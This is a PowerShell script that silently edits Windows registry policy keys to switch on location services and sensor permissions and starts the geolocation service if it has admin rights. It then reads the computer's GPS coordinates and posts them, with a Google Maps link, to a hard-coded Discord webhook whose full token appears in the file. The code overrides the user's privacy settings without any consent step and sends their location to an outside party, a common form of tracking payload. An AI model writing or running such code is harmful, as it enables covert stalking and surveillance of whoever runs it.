Add-Type -AssemblyName System.Device  # Required to access System.Device.Location namespace

# Your Discord webhook URL
$webhookUrl = 'https://discord.com/api/webhooks/1386838200089182319/DFvenBNwWaKMzXWX-HfhQy6IkkuGCo4yAcGKuTDs_IYpvrlWrXv0bnIyUNiV2GwYLvju'

function Send-DiscordEmbed {
    param(
        [string]$Title,
        [string]$Description,
        [int]$Color = 15158332  # Red by default
    )

    $embed = @{
        username   = 'GeoBot'
        avatar_url = 'https://i.imgur.com/4M34hi2.png'
        embeds     = @(
            @{
                title       = $Title
                description = $Description
                color       = $Color
                timestamp   = (Get-Date).ToString("o")
            }
        )
    }

    try {
        Invoke-RestMethod -Uri $webhookUrl `
                          -Method Post `
                          -Body ($embed | ConvertTo-Json -Depth 4) `
                          -ContentType 'application/json'
    }
    catch {
        Write-Error "Failed to send error webhook: $_"
    }
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Enable-LocationServices {
    try {
        # Check if running as admin
        $isAdmin = Test-Admin

        # 1. Enable System-Wide Location Services (HKLM, admin required)
        if ($isAdmin) {
            $locationKey = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors'
            if (-not (Test-Path $locationKey)) {
                New-Item -Path $locationKey -Force | Out-Null
            }
            Set-ItemProperty -Path $locationKey -Name 'DisableLocation' -Value 0 -Type DWord -Force
            Send-DiscordEmbed -Title 'Registry Update' -Description 'System-wide location services enabled (DisableLocation set to 0).' -Color 3447003
        } else {
            Send-DiscordEmbed -Title 'Warning' -Description 'Skipping HKLM location registry change (admin required).' -Color 16776960  # Yellow
        }

        # 2. Enable Sensor Permissions (HKLM, admin required)
        if ($isAdmin) {
            $sensorKey = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Sensor\Overrides'
            if (-not (Test-Path $sensorKey)) {
                New-Item -Path $sensorKey -Force | Out-Null
            }
            Set-ItemProperty -Path $sensorKey -Name 'SensorPermissionState' -Value 1 -Type DWord -Force
            Send-DiscordEmbed -Title 'Registry Update' -Description 'Sensor permissions enabled (SensorPermissionState set to 1).' -Color 3447003
        } else {
            Send-DiscordEmbed -Title 'Warning' -Description 'Skipping HKLM sensor registry change (admin required).' -Color 16776960
        }

        # 3. Enable User-Specific Location Access (HKCU, no admin required)
        $userLocationKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location'
        if (-not (Test-Path $userLocationKey)) {
            New-Item -Path $userLocationKey -Force | Out-Null
        }
        Set-ItemProperty -Path $userLocationKey -Name 'Value' -Value 'Allow' -Type String -Force
        Send-DiscordEmbed -Title 'Registry Update' -Description 'User-specific location access enabled (Value set to Allow).' -Color 3447003

        # 4. Ensure Geolocation Service (lfsvc) is running (admin required)
        if ($isAdmin) {
            $service = Get-Service -Name 'lfsvc' -ErrorAction SilentlyContinue
            if ($service -and $service.Status -ne 'Running') {
                Start-Service -Name 'lfsvc' -ErrorAction Stop
                Send-DiscordEmbed -Title 'Service Update' -Description 'Geolocation Service (lfsvc) started.' -Color 3447003
            } elseif (-not $service) {
                Send-DiscordEmbed -Title 'Warning' -Description 'Geolocation Service (lfsvc) not found on system.' -Color 16776960
            }
        } else {
            Send-DiscordEmbed -Title 'Warning' -Description 'Skipping Geolocation Service start (admin required).' -Color 16776960
        }
    }
    catch {
        $errorMessage = $_.Exception.Message
        Send-DiscordEmbed -Title 'Registry/Service Error' -Description "Failed to update registry or service: $errorMessage" -Color 15158332
        Write-Error "Failed to update registry/service: $errorMessage"
    }
}

try {
    # Attempt to enable location services and registry settings
    Enable-LocationServices

    # Create and start the GeoCoordinateWatcher
    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $GeoWatcher.Start()

    # Wait until we have a fix or the user denies permission
    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
        Start-Sleep -Milliseconds 100
    }

    if ($GeoWatcher.Permission -eq 'Denied') {
        throw "Access Denied for Location Information"
    }

    # Grab the coordinates
    $location = $GeoWatcher.Position.Location
    if ($null -eq $location) {
        throw "Unable to retrieve location data."
    }

    $lat = $location.Latitude
    $lon = $location.Longitude
    $mapUrl = "https://www.google.com/maps?q=$lat,$lon"

    # Build and send success embed
    $successEmbed = @{
        username   = 'GeoBot'
        avatar_url = 'https://i.imgur.com/4M34hi2.png'
        embeds     = @(
            @{
                title  = 'Current Location'
                url    = $mapUrl
                color  = 3447003       # Blue
                fields = @(
                    @{ name = 'Latitude';  value = "$lat";           inline = $true },
                    @{ name = 'Longitude'; value = "$lon";           inline = $true },
                    @{ name = 'Map';       value = "[View on Google Maps]($mapUrl)"; inline = $false }
                )
                footer = @{
                    text = "Retrieved at $(Get-Date -Format u)"
                }
            }
        )
    }

    Invoke-RestMethod -Uri $webhookUrl `
                      -Method Post `
                      -Body ($successEmbed | ConvertTo-Json -Depth 4) `
                      -ContentType 'application/json'

    Write-Host "Location + map link sent to Discord webhook."
}
catch {
    # On any error, send an error embed with the message
    $errorMessage = $_.Exception.Message
    Send-DiscordEmbed -Title 'Error Retrieving Location' `
                      -Description $errorMessage `
                      -Color 15158332  # Red
    Write-Error "Script failed: $errorMessage"
}
